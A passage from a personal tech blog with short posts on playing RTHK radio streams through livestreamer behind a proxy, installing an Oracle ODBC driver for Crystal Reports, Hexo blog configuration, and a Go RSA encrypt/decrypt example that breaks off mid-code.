<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Archive/Firefox_OS/Debugging/Installing_ADB">ADB FIFO example</a><br><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/android_tethering">USB tethering</a><br><a target="_blank" rel="noopener" href="https://github.com/lanceseidman/PiCAST">https://github.com/lanceseidman/PiCAST</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Play-audiovideo-using-livestreamer" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-01-09T10:38:56.000Z"><a href="/2017/01/09/Play-audiovideo-using-livestreamer/">2017-01-09</a></time>
      
      
  
    <h1 class="title"><a href="/2017/01/09/Play-audiovideo-using-livestreamer/">Play audio/video using livestreamer</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Download livestreamer-v1.12.2-win32.zip from <a target="_blank" rel="noopener" href="http://docs.livestreamer.io/install.html#windows-binaries">http://docs.livestreamer.io/install.html#windows-binaries</a></li>
</ul>
<h2 id="Play-stream"><a href="#Play-stream" class="headerlink" title="Play stream"></a>Play stream</h2><h3 id="City-Snapshot-from-rthk"><a href="#City-Snapshot-from-rthk" class="headerlink" title="City_Snapshot from rthk"></a>City_Snapshot from rthk</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 hlsvariant://http://stmw.rthk.hk/aod/_definst_/radio/archive/radio1/City_Snapshot/mp3/mp3:20161129.mp3/playlist.m3u8 best -p &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; --verbose-player --stream-types=hls</code></p>
<h3 id="RTHK-Radio-1"><a href="#RTHK-Radio-1" class="headerlink" title="RTHK Radio 1"></a>RTHK Radio 1</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 hlsvariant://http://rthkaudio1-lh.akamaihd.net/i/radio1_1@355864/master.m3u8 best -p C:\Users\User\Downloads\mpv-x86_64-20170102-git-8e41f31\mpv.exe</code></p>
<h3 id="RTHK-Radio-2"><a href="#RTHK-Radio-2" class="headerlink" title="RTHK Radio 2"></a>RTHK Radio 2</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 hlsvariant://http://rthkaudio2-lh.akamaihd.net/i/radio2_1@355865/master.m3u8 best -p C:\Users\User\Downloads\mpv-x86_64-20170102-git-8e41f31\mpv.exe</code></p>
<h3 id="Play-香港卫视"><a href="#Play-香港卫视" class="headerlink" title="Play 香港卫视"></a>Play 香港卫视</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 hlsvariant://http://live.hkstv.hk.lxdns.com/live/hks/playlist.m3u8 best -p &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; </code></p>
<h3 id="Play-Faded-from-Alan-Walker"><a href="#Play-Faded-from-Alan-Walker" class="headerlink" title="Play Faded from Alan Walker"></a>Play Faded from Alan Walker</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 https://www.youtube.com/watch?v=60ItHLz5WEA best -p &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot;</code></p>
<h3 id="Play-RTMP-stream-Need-rtmpdump-exe-in-the-current-folder"><a href="#Play-RTMP-stream-Need-rtmpdump-exe-in-the-current-folder" class="headerlink" title="Play RTMP stream (Need rtmpdump.exe in the current folder)"></a>Play RTMP stream (Need rtmpdump.exe in the current folder)</h3><p>  <code>livestreamer --https-proxy=http://proxy1.scig.gov.hk:8080 --http-proxy=http://proxy1.scig.gov.hk:8080 rtmp://live.hkstv.hk.lxdns.com/live/hks best -p &quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot;</code></p>
<h2 id="Play-by-external-player"><a href="#Play-by-external-player" class="headerlink" title="Play by external player"></a>Play by external player</h2><ol>
<li><p><code>livestreamer --https-proxy=http://10.13.135.115:8080 --http-proxy=http://10.13.135.115:8080 hlsvariant://http://stmw.rthk.hk/aod/_definst_/radio/archive/radio1/City_Snapshot/mp3/mp3:20161214.mp3/playlist.m3u8 best --player-external-http --player-external-http-port=12345 --verbose-player --stream-types=hls</code></p>
</li>
<li><p><code>livestreamer --https-proxy=http://10.13.135.115:8080 --http-proxy=http://10.13.135.115:8080 hlsvariant://http://live.hkstv.hk.lxdns.com/live/hks/playlist.m3u8 best --player-external-http --player-external-http-port=12345 --verbose-player --stream-types=hls</code></p>
</li>
</ol>
<h2 id="Some-player-gstreamer-ffplay-vlc-wmplayer-mpc-hc-mpv-potplayer"><a href="#Some-player-gstreamer-ffplay-vlc-wmplayer-mpc-hc-mpv-potplayer" class="headerlink" title="Some player: gstreamer, ffplay, vlc, wmplayer, mpc-hc, mpv, potplayer"></a>Some player: gstreamer, ffplay, vlc, wmplayer, mpc-hc, mpv, potplayer</h2><ul>
<li><p>Reference:<br><a target="_blank" rel="noopener" href="http://docs.livestreamer.io/">http://docs.livestreamer.io/</a><br><a target="_blank" rel="noopener" href="https://github.com/streamlink/streamlink">https://github.com/streamlink/streamlink</a><br><a target="_blank" rel="noopener" href="https://github.com/chrippa/livestreamer/issues/624">livestreamer UPnP&#x2F;DLNA output - https://github.com/chrippa/livestreamer/issues/624</a><br><a target="_blank" rel="noopener" href="https://wiki.videolan.org/Documentation:Streaming_HowTo/Command_Line_Examples/#MMS_.2F_MMSH_streaming_to_Windows_Media_Player">MMS &#x2F; MMSH streaming to Windows Media Player by VLC</a></p>
</li>
<li><p>Others<br><a target="_blank" rel="noopener" href="http://www.jianshu.com/p/e7d2c3a624f6">网络流媒体下载的 10 种方法(以下载 Echo 音乐为例)</a><br><a target="_blank" rel="noopener" href="http://www.jianshu.com/p/a3f8df948395">You-Get——基于Python3的媒体下载工具</a><br><a target="_blank" rel="noopener" href="http://www.coolapk.com/apk/com.phantom.onetapvideodownload">一键下载视频:Xposed One Tap Video Download</a><br><a target="_blank" rel="noopener" href="https://blog.gtwang.org/iot/raspberry-pi-nginx-rtmp-server-live-streaming/">樹莓派架設 RTMP 串流（Streaming）伺服器</a><br><a target="_blank" rel="noopener" href="https://nwgat.ninja/installing-mpv-with-hardware-decoding-on-raspberry-pi-1-2-3-zero/">Installing MPV with Hardware Decoding on Raspberry Pi</a><br><a target="_blank" rel="noopener" href="http://serviio.org/component/content/article/10-uncategorised/42-online-content-management">serviio dlna server</a></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-Oracle-ODBC-Driver-for-Crystal-Report" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2016-11-08T11:05:02.000Z"><a href="/2016/11/08/Install-Oracle-ODBC-Driver-for-Crystal-Report/">2016-11-08</a></time>
      
      
  
    <h1 class="title"><a href="/2016/11/08/Install-Oracle-ODBC-Driver-for-Crystal-Report/">Install Oracle ODBC Driver for Crystal Report</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="Install-Oracle-ODBC-Driver-in-Windows-7-64-bit"><a href="#Install-Oracle-ODBC-Driver-in-Windows-7-64-bit" class="headerlink" title="Install Oracle ODBC Driver in Windows 7(64-bit)"></a>Install Oracle ODBC Driver in Windows 7(64-bit)</h2><p>Try to install OracleXE 32-bit and 64-bit version to install the odbc driver for starting Crystal Report but fail.</p>
<p>And fail to install ODAC to fix 32bit odbc driver for Crystal Report</p>
<h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><ul>
<li>Download instantclient-odbc-nt-11.2.0.2.0 and instantclient-basic-nt-11.2.0.2.0, extract them to the same folder, run<br><code>odbc_install.exe</code></li>
<li>Add the TNS_ADMIN environment variable indicating the path of tnsnames.ora file such as c:\oracle\11.2.0\CLIENT\network\admin</li>
<li>Run <code>c:\windows\SysWOW64\odbcad32.exe</code> to configure DSN by choosing a driver which like <em>instant_client_11</em>, rather than calling <code>%windir%\system32\odbcad32.exe</code> to install the driver.</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://itkbs.wordpress.com/2014/07/28/how-to-install-odbc-driver-for-oracle-in-windows-7/">https://itkbs.wordpress.com/2014/07/28/how-to-install-odbc-driver-for-oracle-in-windows-7/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-hexo-config-and-light-theme-config" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2016-11-04T04:01:09.000Z"><a href="/2016/11/04/hexo-config-and-light-theme-config/">2016-11-04</a></time>
      
      
  
    <h1 class="title"><a href="/2016/11/04/hexo-config-and-light-theme-config/">hexo config and light theme config</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>For migration in different machine, drop down the config as below</p>
<p>Requirements</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node.<span class="keyword">js </span>&amp; Git</span><br><span class="line">npm <span class="keyword">install </span>-g hexo-cli</span><br><span class="line">npm <span class="keyword">install </span>hexo --save</span><br><span class="line">npm <span class="keyword">install </span>hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>Create blog folder</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line"></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">my-blog</span>.git from bitbucket into source\_posts</span><br><span class="line"></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">--depth</span> <span class="number">1</span> https://github.com/hexojs/hexo-theme-light themes/light</span><br></pre></td></tr></table></figure>

<p>_config.yml of hexo</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">My</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">My</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Forrest</span> <span class="string">Wan</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span></span><br><span class="line"><span class="attr">timezone:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">l1z2g9.github.io</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span></span><br><span class="line"><span class="attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">light</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/l1z2g9/l1z2g9.github.io</span></span><br></pre></td></tr></table></figure>

<p>_config.yml of light theme</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Home:</span></span><br><span class="line">  <span class="attr">Archives:</span> <span class="string">archives</span></span><br><span class="line"></span><br><span class="line"><span class="attr">widgets:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">search</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">category</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">tag</span></span><br><span class="line"></span><br><span class="line"><span class="attr">excerpt_link:</span> <span class="string">Read</span> <span class="string">More</span></span><br><span class="line"></span><br><span class="line"><span class="attr">twitter:</span></span><br><span class="line">  <span class="attr">username:</span></span><br><span class="line">  <span class="attr">show_replies:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tweet_count:</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attr">addthis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">pubid:</span></span><br><span class="line">  <span class="attr">facebook:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">twitter:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">google:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pinterest:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">google_analytics:</span></span><br><span class="line"><span class="attr">rss:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">comment_provider:</span> <span class="string">facebook</span></span><br><span class="line"><span class="comment"># Facebook comment</span></span><br><span class="line"><span class="attr">facebook:</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="number">123456789012345</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">comment_width:</span> <span class="number">840</span></span><br><span class="line">  <span class="attr">comment_colorscheme:</span> <span class="string">light</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-RSA-Encrypt-Decrypt-with-Golang" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2016-11-04T03:19:09.000Z"><a href="/2016/11/04/RSA-Encrypt-Decrypt-with-Golang/">2016-11-04</a></time>
      
      
  
    <h1 class="title"><a href="/2016/11/04/RSA-Encrypt-Decrypt-with-Golang/">RSA Encrypt Decrypt with Golang</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://github.com/jasondavies/jsbn">https://github.com/jasondavies/jsbn</a> &amp;&amp; <a target="_blank" rel="noopener" href="http://www-cs-students.stanford.edu/~tjw/jsbn/rsa.html">http://www-cs-students.stanford.edu/~tjw/jsbn/rsa.html</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/36450743/go-how-to-set-rsa-publickey-modulus-from-string">http://stackoverflow.com/questions/36450743/go-how-to-set-rsa-publickey-modulus-from-string</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;crypto&quot;</span><br><span class="line">	&quot;crypto/rand&quot;</span><br><span class="line">	&quot;crypto/rsa&quot;</span><br><span class="line">	&quot;crypto/sha1&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;io&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	// generate private key</span><br><span class="line">	privatekey, err := rsa.GenerateKey(rand.Reader, 1024)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err.Error)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	D := privatekey.D //private exponent</span><br><span class="line">	Primes := privatekey.Primes</span><br><span class="line">	PCValues := privatekey.Precomputed</span><br><span class="line"></span><br><span class="line">	// Note : Only used for 3rd and subsequent primes</span><br><span class="line">	//CRTVal := privatekey.Precomputed.CRTValues</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Private Key : &quot;, privatekey)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Println(&quot;Private Exponent : &quot;, D.String())</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Printf(&quot;Primes : %s %s \n&quot;, Primes[0].String(), Primes[1].String())</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Printf(&quot;Precomputed Values : Dp[%s] Dq[%s]\n&quot;, PCValues.Dp.String(), PCValues.Dq.String())</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Printf(&quot;Precomputed Values : Qinv[%s]&quot;, PCValues.Qinv.String())</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// Note : Only used for 3rd and subsequent primes</span><br><span class="line">	//fmt.Printf(&quot;CRTValues : Exp[%s]\n Coeff[%s]\n R[%s]\n&quot;, CRTVal[2].Exp.String(), CRTVal[2].Coeff.String(), CRTVal[2].R.String())</span><br><span class="line"></span><br><span class="line">	// Note : if you want to have multi primes,</span><br><span class="line">	//        use rsa.GenerateMultiPrimeKey() function instead of</span><br><span class="line">	//        rsa.GenerateKey() function</span><br><span class="line">	//        see http://golang.org/pkg/crypto/rsa/#GenerateMultiPrimeKey</span><br><span class="line"></span><br><span class="line">	// http://golang.org/pkg/crypto/rsa/#PrivateKey.Precompute</span><br><span class="line">	privatekey.Precompute()</span><br><span class="line"></span><br><span class="line">	// http://golang.org/pkg/crypto/rsa/#PrivateKey.Validate</span><br><span class="line">	err = privatekey.Validate()</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err.Error)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	var publickey *rsa.PublicKey</span><br><span class="line">	publickey = &amp;privatekey.PublicKey</span><br><span class="line">	N := publickey.N // modulus</span><br><span class="line">	E := publickey.E // public exponent</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Public key &quot;, publickey)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Println(&quot;Public Exponent : &quot;, E)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	fmt.Println(&quot;Modulus : &quot;, N.String())</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// EncryptOAEP</span><br><span class="line">	msg := []byte(&quot;The secret message!&quot;)</span><br><span class="line">	label := []byte(&quot;&quot;)</span><br><span class="line">	sha1hash := sha1.New()</span><br><span class="line"></span><br><span class="line">	encryptedmsg, err := rsa.EncryptOAEP(sha1hash, rand.Reader, publickey, msg, label)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;OAEP encrypted [%s] to \n[%x]\n&quot;, string(msg), encryptedmsg)</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// DecryptOAEP</span><br><span class="line">	decryptedmsg, err := rsa.DecryptOAEP(sha1hash, rand.Reader, privatekey, encryptedmsg, label)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;OAEP decrypted [%x] to \n[%s]\n&quot;, encryptedmsg, decryptedmsg)</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// EncryptPKCS1v15</span><br><span class="line">	encryptedPKCS1v15, errPKCS1v15 := rsa.EncryptPKCS1v15(rand.Reader, publickey, msg)</span><br><span class="line"></span><br><span class="line">	if errPKCS1v15 != nil &#123;</span><br><span class="line">		fmt.Println(errPKCS1v15)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;PKCS1v15 encrypted [%s] to \n[%x]\n&quot;, string(msg), encryptedPKCS1v15)</span><br><span class="line">	fmt.Println()</span><br><span class="line"></span><br><span class="line">	// DecryptPKCS1v15</span><br><span class="line">	decryptedPKCS1v15, err := rsa.DecryptPKCS1v15(rand.Reader, privatekey, encryptedPKCS1v15)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		os.Exit(1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(&quot;PKCS1v15 decrypted [%x] to 